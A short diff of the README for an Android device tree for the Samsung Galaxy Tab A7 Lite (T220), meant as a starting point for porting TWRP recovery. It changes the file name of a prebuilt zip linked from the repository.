@@ -1,7 +1,7 @@
 This device tree was made with the intention to help users with this device, blindly helped with the help of users owning the device.
 It will boot, feel free to fork this and do whatever you want. Take this as a start point to port twrp to your device.
 
-### https://raw.githubusercontent.com/Marzelthan29/android_device_samsung_gta7lite/gta7litewifixx/prebuilt/device_gta_samsung_android_lite_1.3-alpha.2.zip
+### https://raw.githubusercontent.com/Marzelthan29/android_device_samsung_gta7lite/gta7litewifixx/prebuilt/android-lite-samsung-device-gta-1.2.zip
 ```xml
 <manifest>
   <!--T220-->
